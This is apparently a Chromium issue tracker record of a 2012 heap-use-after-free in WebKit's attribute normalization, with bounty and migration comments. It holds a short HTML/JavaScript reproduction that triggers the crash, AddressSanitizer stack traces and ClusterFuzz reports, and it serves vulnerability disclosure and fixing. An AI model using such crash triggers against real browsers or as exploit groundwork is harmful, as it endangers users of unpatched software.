# Heap-use-after-free in WebCore::Element::normalizeAttributes

| Field | Value |
|-------|-------|
| **Issue ID** | [40076668](https://issues.chromium.org/issues/40076668) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | mo...@google.com |
| **Created** | 2012-12-08 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

use-after-free in size /b/build/slave/ASAN\_Release/build/third\_party/WebKit/Source/WTF/wtf/Vector.h:544

**VERSION**  

Chrome Version: dev  

Operating System: linux

**REPRODUCTION CASE**

<html>
<head>
<script>
var el = document.createElement('div')
el.setAttribute('a', 'a')
el.setAttribute('b', 'b')
el.attributes[1].appendChild(document.createTextNode())
el.attributes[1].addEventListener('DOMSubtreeModified', function() { el.removeAttribute('b') }, false)
el.normalize()
</script>
</head>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab + asan  

Crash State:

==28787== ERROR: AddressSanitizer: heap-use-after-free on address 0x7fffca3b14c0 at pc 0x555558b4abfb bp 0x7fffffff8430 sp 0x7fffffff8428  

READ of size 8 at 0x7fffca3b14c0 thread T0  

#0 0x555558b4abfa in size /b/build/slave/ASAN\_Release/build/third\_party/WebKit/Source/WTF/wtf/Vector.h:544  

#1 0x555558b82791 in normalize /b/build/slave/ASAN\_Release/build/third\_party/WebKit/Source/WebCore/dom/Node.cpp:613  

#2 0x55555bd25354 in normalizeCallback /b/build/slave/ASAN\_Release/build/out/Release/obj/gen/webcore/bindings/V8Node.cpp:224  

#3 0x555559126f29 in HandleApiCallHelper<false> /b/build/slave/ASAN\_Release/build/v8/src/builtins.cc:1372

0x7fffca3b14c0 is located 0 bytes inside of 24-byte region [0x7fffca3b14c0,0x7fffca3b14d8)  

freed by thread T0 here:  

#0 0x55555ffc86f0 in \_\_interceptor\_free ??:0  

#1 0x555558b2ed78 in ~OwnPtr /b/build/slave/ASAN\_Release/build/third\_party/WebKit/Source/WTF/wtf/OwnPtr.h:63  

#2 0x555558b2f28f in removeAttributeInternal /b/build/slave/ASAN\_Release/build/third\_party/WebKit/Source/WebCore/dom/Element.cpp:1658  

#3 0x555558b45d4d in removeAttribute /b/build/slave/ASAN\_Release/build/third\_party/WebKit/Source/WebCore/dom/Element.cpp:1688

## Attachments

- [024.html](attachments/024.html) (text/html; charset=us-ascii, 375 B)
- [024.txt](attachments/024.txt) (text/plain; charset=us-ascii, 8.5 KB)

## Timeline

### in...@chromium.org (2012-12-09)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=139969549

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7fe7ed79e280
Crash State:
  - crash stack -
  WebCore::Element::normalizeAttributes
  WebCore::Node::normalize
  - free stack -
  WebCore::Element::detachAttrNodeFromElementWithValue
  WebCore::Element::removeAttributeInternal
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=165917:166150

Minimized Testcase (0.32 Kb): https://cluster-fuzz.appspot.com/download/AMIfv94AdmGfJB0YkJntxWTlYkCjoTPJdr_2GAejyBo90VlxPa8kx02nWFlTndMWqflouUaKM7ovsKjj0tnlaKnugUXK4KvmKbCQafEShP5TC7ksCH0cC3Ckl9JNWVrvi2lhxTe61i4biXFqEug0V5TVkAF5r0aljFI5LnIsKuO8qjiQTYFG4x4

### in...@chromium.org (2012-12-09)

https://bugs.webkit.org/show_bug.cgi?id=104488

### in...@chromium.org (2012-12-12)

http://trac.webkit.org/changeset/137341

### cl...@chromium.org (2012-12-13)

ClusterFuzz has detected this issue as fixed in range 172434:172624.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=139969549

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7fe7ed79e280
Crash State:
  - crash stack -
  WebCore::Element::normalizeAttributes
  WebCore::Node::normalize
  - free stack -
  WebCore::Element::detachAttrNodeFromElementWithValue
  WebCore::Element::removeAttributeInternal
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=165917:166150
Fixed: https://cluster-fuzz.appspot.com/revisions?range=172434:172624

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv94AdmGfJB0YkJntxWTlYkCjoTPJdr_2GAejyBo90VlxPa8kx02nWFlTndMWqflouUaKM7ovsKjj0tnlaKnugUXK4KvmKbCQafEShP5TC7ksCH0cC3Ckl9JNWVrvi2lhxTe61i4biXFqEug0V5TVkAF5r0aljFI5LnIsKuO8qjiQTYFG4x4

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sc...@gmail.com (2013-01-22)

@miaubiz, thanks for the regression catch, $1000 etc.

### pa...@chromium.org (2013-02-25)

[Empty comment from Monorail migration]

### pa...@chromium.org (2013-03-05)

This one's reward payment is on its way too!

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-05)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/165015?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40076668)*
